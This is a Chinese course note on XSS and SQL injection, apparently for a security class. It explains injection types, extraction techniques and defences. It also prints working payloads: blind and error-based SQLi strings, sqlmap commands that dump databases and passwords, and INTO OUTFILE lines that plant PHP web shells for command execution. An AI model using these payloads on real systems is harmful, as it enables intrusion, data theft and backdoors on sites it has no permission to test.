{"title":"第四次课程-XSS与SQL注入","uid":"b01c54bfa7b8abe9af0697abfd45eff9","slug":"第四次课程-XSS与SQL注入","date":"2024-02-02T07:12:03.000Z","updated":"2024-03-07T07:18:00.953Z","comments":true,"path":"api/articles/第四次课程-XSS与SQL注入.json","keywords":null,"cover":null,"content":"<h2 id=\"XSS基础\"><a href=\"#XSS基础\" class=\"headerlink\" title=\"XSS基础\"></a>XSS基础</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p><a href=\"https://www.cnblogs.com/sfsec/p/15178028.html\">XSS过滤绕过总结 - 随风kali - 博客园 (cnblogs.com)</a></p>\n<ul>\n<li><p>跨站脚本，英文全称：Cross-Site Scripting</p>\n</li>\n<li><p>通过输入可以被解析的特殊字符串, 如</p>\n<div class=\"language-html\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">html</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">p</span><span style=\"color: #89DDFF\">&gt;&lt;</span><span style=\"color: #F07178\">script</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #82AAFF\">alert</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">this is an alart</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;&lt;/</span><span style=\"color: #F07178\">script</span><span style=\"color: #89DDFF\">&gt;&lt;</span><span style=\"color: #F07178\">p</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><p>其中script标签内的代码会被执行</p>\n</li>\n<li><p>分类: 反射型XSS, 储存型XSS, DOM型XSS</p>\n<ul>\n<li><p>反射型XSS</p>\n<ul>\n<li><p>执行流程:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、在输入点输入内容，构造恶意代码，输入点是以GET方式提交的，我们可以在URL中看到输入的内容<br>2、后端接收提交的数据，并没有对输入进行过滤<br>3、然后就将其呈现给了前端，浏览器执行了恶意代码</p></blockquote>\n</li>\n</ul>\n</li>\n<li><p>存储型XSS</p>\n<ul>\n<li><p>存储型XSS和反射型XSS区别就在于，存储型XSS是将恶意构造的代码存储在了数据库</p>\n</li>\n<li><p>执行流程:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、在留言板处输入内容，构造恶意代码<br>2、将输入的内容，提交给后端代码执行，后端对输入过滤不严格，然后执行插入(insert)数据库操作<br>3、此时，我们的恶意代码已经保存在了数据库，<br>4、不管何时何地何人查看这条留言，都会被执行恶意代码，除非数据库中删除这条恶意代码</p></blockquote>\n</li>\n</ul>\n</li>\n<li><p>DOM型XSS</p>\n<ul>\n<li>基于文档对象模型的漏洞，可以动态的构造DOM节点</li>\n<li>不经过后端代码，直接构造恶意代码，即可在前端展示</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>练习:<a href=\"https://xss.haozi.me/#/0x00\">alert(1) (haozi.me)</a></p>\n</li>\n</ul>\n<hr>\n<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><h4 id=\"文章推荐\"><a href=\"#文章推荐\" class=\"headerlink\" title=\"文章推荐\"></a>文章推荐</h4><ul>\n<li><p><a href=\"https://blog.csdn.net/sunjikui1255326447/article/details/106440534/\">web渗透【11】phpmyadmin写shell的三种方法-CSDN博客</a></p>\n</li>\n<li><p><a href=\"https://luckyfuture.top/sqli-summary.html\">SQL注入总结 | Lucky Future的技术栈</a></p>\n</li>\n<li><p><a href=\"https://github.com/luckyfuture0177/VULOnceMore/blob/main/%E6%88%98%E6%9C%AF%E6%8A%80%E5%B7%A7/SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.md\">VULOnceMore&#x2F;战术技巧&#x2F;SQL注入利用总结</a></p>\n</li>\n</ul>\n<h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><ul>\n<li><p>攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露</p>\n</li>\n<li><p>例如:<br>正常输入: <code>1</code>, 执行<code>select password from users where id=1</code><br>非法输入:<code>1 or 1=1</code>, 执行<code>select password from users where id=1 or 1=1;</code><br>后者会输出表中的所有password</p>\n</li>\n</ul>\n<h4 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h4><ol>\n<li><p>注入点探测(自动&#x2F;手动)</p>\n<ul>\n<li>判断注入点类型</li>\n<li>判断查询列数</li>\n<li>判断显示位置</li>\n</ul>\n</li>\n<li><p>信息获取</p>\n<ul>\n<li><p>获取所有数据库名</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>一次性显示全部:group_concat(字段名)</p>\n<p>逐一显示: limit</p></blockquote>\n</li>\n<li><p>获取某数据库所有表名</p>\n</li>\n<li><p>获取某库某表中所有字段名</p>\n</li>\n<li><p>获取字段的数据</p>\n</li>\n</ul>\n</li>\n<li><p>获取权限</p>\n</li>\n</ol>\n<h4 id=\"注入点类型\"><a href=\"#注入点类型\" class=\"headerlink\" title=\"注入点类型\"></a>注入点类型</h4><ul>\n<li>数字型</li>\n<li>字符型: <code>&#39;xxx&#39;</code></li>\n<li>搜索型: <code>%xxx%</code></li>\n</ul>\n<p><em>根据类型进行构造闭合</em></p>\n<h4 id=\"基于union联合查询的信息获取\"><a href=\"#基于union联合查询的信息获取\" class=\"headerlink\" title=\"基于union联合查询的信息获取\"></a>基于union联合查询的信息获取</h4><ul>\n<li>查询列数必须相同</li>\n</ul>\n<h4 id=\"判断查询列数\"><a href=\"#判断查询列数\" class=\"headerlink\" title=\"判断查询列数\"></a>判断查询列数</h4><ul>\n<li>order by: 按照指定字段名进行排序</li>\n</ul>\n<h4 id=\"基于报错信息获取\"><a href=\"#基于报错信息获取\" class=\"headerlink\" title=\"基于报错信息获取\"></a>基于报错信息获取</h4><ul>\n<li>使用一些指定的函数来制造报错, 从报错信息中获取特定的信息</li>\n<li>背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端</li>\n</ul>\n<h5 id=\"报错函数\"><a href=\"#报错函数\" class=\"headerlink\" title=\"报错函数\"></a>报错函数</h5><ul>\n<li><p><code>updatexml()</code></p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">updatexml(xml_document, XPathstring, new_value)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#第一个参数: 表中的字段名(字符串)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#第二个参数:Xpath格式的字符串</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#String格式，替换查找到的符合条件的</span></span></code></pre></div><p>**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信</p>\n<p>例如<code>updatexml(1,concat(0x7e,database(),0))</code>会产生报错信息, 其中有<code>database()</code>执行的结果</p>\n</li>\n<li><p><code>extractvalue()</code></p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">extractvalue(xml_document, xpath_string)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">#同样通过xpath产生报错</span></span></code></pre></div></li>\n<li><p><code>floor()</code><br>取整函数, 示例:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">xxx</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h4><ul>\n<li>后台屏蔽了报错信息, 无法根据报错进行注入的判断  </li>\n<li>分类<ul>\n<li>基于真假, 例:<code>vince&#39; and ascii(substr(database(),1,1))=112#</code></li>\n<li>基于时间, 例:<code>vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#</code></li>\n</ul>\n</li>\n<li>通过<code>ascii(substr((xx语句), n, n))=x</code>判断</li>\n</ul>\n<h4 id=\"进行远程控制\"><a href=\"#进行远程控制\" class=\"headerlink\" title=\"进行远程控制\"></a>进行远程控制</h4><ul>\n<li>远程代码执行</li>\n</ul>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">vince</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> union select &quot;&lt;?php @eval($_GET[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">test</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">])?&gt;&quot;,2 into outfile &quot;/var/www/html/1.php&quot;#</span></span></code></pre></div><ul>\n<li>远程漏洞执行</li>\n</ul>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">vince</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> union select &quot;&lt;?php system($_GET[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">cmd</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">])?&gt;&quot;,2 into outfile &quot;/var/www/html/2.php&quot;#</span></span></code></pre></div><h2 id=\"跨库查询\"><a href=\"#跨库查询\" class=\"headerlink\" title=\"跨库查询\"></a>跨库查询</h2><h4 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h4><ul>\n<li>在权限较大时才可以进行跨库查询</li>\n</ul>\n<h4 id=\"查询库\"><a href=\"#查询库\" class=\"headerlink\" title=\"查询库\"></a>查询库</h4><ul>\n<li><p><code>SELECT SCHENA_NAME from information_schema.SCHEMATA limit n, 1;</code>查询第n个(下标从0开始)库的名字</p>\n<p>输出:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">-------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| schema_name |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">-------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| myprefer    |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">-------------+</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"查询表\"><a href=\"#查询表\" class=\"headerlink\" title=\"查询表\"></a>查询表</h4><ul>\n<li><p>select table_name from information_schema.`TABLES` where table_schema&#x3D;’myprefer’ limit 0,1;<br>输出:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| table_name |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| websites   |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">------------+</span></span></code></pre></div></li>\n<li><p>将数据库名转为16进制:<code>select hex(&#39;myprefer&#39;);</code><br>输出:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">------------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| hex(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">myprefer</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)  |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">------------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| 6D79707265666572 |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">------------------+</span></span></code></pre></div></li>\n<li><p>这样就可以把<code>table_schema=&#39;myprefer&#39;</code>里的<code>&#39;myprefer&#39;</code>替换成<code>0x6D79707265666572</code><br>即: select table_name from information_schema.`TABLES` where table_schema&#x3D;0x6D79707265666572 limit 0,1;</p>\n</li>\n</ul>\n<h4 id=\"查找列\"><a href=\"#查找列\" class=\"headerlink\" title=\"查找列\"></a>查找列</h4><ul>\n<li><p>select collation_name from information_schema.`columns` where table_schema&#x3D;0x6D79707265666572 and table_name&#x3D;’websites’; 获取全部列名<br>输出:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">-------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| column_name |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">-------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| id          |</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| </span><span style=\"color: #F78C6C\">name</span><span style=\"color: #BABED8\">        |</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| </span><span style=\"color: #F78C6C\">url</span><span style=\"color: #BABED8\">         |</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| alexa       |</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| country     |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">-------------+</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"查询结果\"><a href=\"#查询结果\" class=\"headerlink\" title=\"查询结果\"></a>查询结果</h4><ul>\n<li><p>有了上面查找到的信息, 我们就可以定位到目标信息, 比如要得到<code>id</code>和<code>name</code>:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">select</span><span style=\"color: #BABED8\"> id,</span><span style=\"color: #F78C6C\">name</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">from</span><span style=\"color: #BABED8\"> myprefer.websites</span></span></code></pre></div><p>输出:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">----+--------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">| id | </span><span style=\"color: #F78C6C\">name</span><span style=\"color: #BABED8\">         |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">----+--------------+</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">|  </span><span style=\"color: #F78C6C\">1</span><span style=\"color: #BABED8\"> | Google       |</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">|  </span><span style=\"color: #F78C6C\">2</span><span style=\"color: #BABED8\"> | 淘宝         |</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">|  </span><span style=\"color: #F78C6C\">3</span><span style=\"color: #BABED8\"> | 菜鸟教程     |</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">+</span><span style=\"color: #676E95; font-style: italic\">----+--------------+</span></span></code></pre></div><p>同理可以获取密码等信息</p>\n</li>\n</ul>\n<h3 id=\"INFORMATION-SCHEMA库\"><a href=\"#INFORMATION-SCHEMA库\" class=\"headerlink\" title=\"INFORMATION_SCHEMA库\"></a>INFORMATION_SCHEMA库</h3><h4 id=\"SCHEMATA表\"><a href=\"#SCHEMATA表\" class=\"headerlink\" title=\"SCHEMATA表\"></a>SCHEMATA表</h4><ul>\n<li><h5 id=\"SCHEMA-NAME字段-数据库名\"><a href=\"#SCHEMA-NAME字段-数据库名\" class=\"headerlink\" title=\"SCHEMA_NAME字段: 数据库名\"></a>SCHEMA_NAME字段: 数据库名</h5></li>\n</ul>\n<h4 id=\"TABLES表\"><a href=\"#TABLES表\" class=\"headerlink\" title=\"TABLES表\"></a>TABLES表</h4><ul>\n<li><h5 id=\"TABLE-SCHEMA字段-数据库名\"><a href=\"#TABLE-SCHEMA字段-数据库名\" class=\"headerlink\" title=\"TABLE_SCHEMA字段: 数据库名\"></a>TABLE_SCHEMA字段: 数据库名</h5></li>\n<li><h5 id=\"TABLE-NAME字段-表名\"><a href=\"#TABLE-NAME字段-表名\" class=\"headerlink\" title=\"TABLE_NAME字段: 表名\"></a>TABLE_NAME字段: 表名</h5></li>\n</ul>\n<h4 id=\"COLUMNS表\"><a href=\"#COLUMNS表\" class=\"headerlink\" title=\"COLUMNS表\"></a>COLUMNS表</h4><ul>\n<li><h5 id=\"TABLE-SCHEMA字段-数据库名-1\"><a href=\"#TABLE-SCHEMA字段-数据库名-1\" class=\"headerlink\" title=\"TABLE_SCHEMA字段: 数据库名\"></a>TABLE_SCHEMA字段: 数据库名</h5></li>\n<li><h5 id=\"TABLE-NAME字段-表名-1\"><a href=\"#TABLE-NAME字段-表名-1\" class=\"headerlink\" title=\"TABLE_NAME字段: 表名\"></a>TABLE_NAME字段: 表名</h5></li>\n<li><h5 id=\"COLUMN-NAME字段-列名\"><a href=\"#COLUMN-NAME字段-列名\" class=\"headerlink\" title=\"COLUMN_NAME字段: 列名\"></a>COLUMN_NAME字段: 列名</h5></li>\n</ul>\n<h4 id=\"防范措施\"><a href=\"#防范措施\" class=\"headerlink\" title=\"防范措施\"></a>防范措施</h4><ul>\n<li>代码层面<ul>\n<li>对输入进行严格的转义和过滤</li>\n<li>使用预处理和参数化(Parameterized)(推荐)</li>\n</ul>\n</li>\n<li>网路层面<ul>\n<li>通过WAF设备启用防SQL注入策略(类似防护系统)</li>\n<li>云端防护</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"SQLmap使用\"><a href=\"#SQLmap使用\" class=\"headerlink\" title=\"SQLmap使用\"></a>SQLmap使用</h4><p><a href=\"https://blog.csdn.net/wangyuxiang946/article/details/131236510\">SQLmap使用教程图文教程（超详细）-CSDN博客</a></p>\n<p><a href=\"https://sqlmap.highlight.ink/\">文档介绍 - sqlmap 用户手册 (highlight.ink)</a></p>\n<ol>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">-u &quot;url&quot; --cookie=&quot;xxx&quot; //带上cookie对URL进行注入探测</span></span></code></pre></div></li>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">-u &quot;url&quot; --cookie=&quot;xxx&quot; --current-db //获取数据库名</span></span></code></pre></div></li>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx --tables //获取表名</span></span></code></pre></div></li>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx --columns //获取列名</span></span></code></pre></div></li>\n<li><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx -C xxx yyy,zzz,xxx --dump //获取指定列的信息</span></span></code></pre></div><p><em>tip</em>:<code>--start 1 --stop 10 (只获取前十列数据)</code></p>\n</li>\n</ol>\n<p>参考:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"> --columns //查看所有列</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --dbs   //查看所有数据库</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --dump //查看字段具体信息</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --users //查看所有用户</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --current-db //查看当前的数据库</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --current-user //产看当前的用户</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --is-dba //查看是否是最高权限</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --passwords //查看所有密码</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> –hostname //查看主机名</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> privileges -U username //查看用户权限</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> –roles //查看用户角色</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --tables 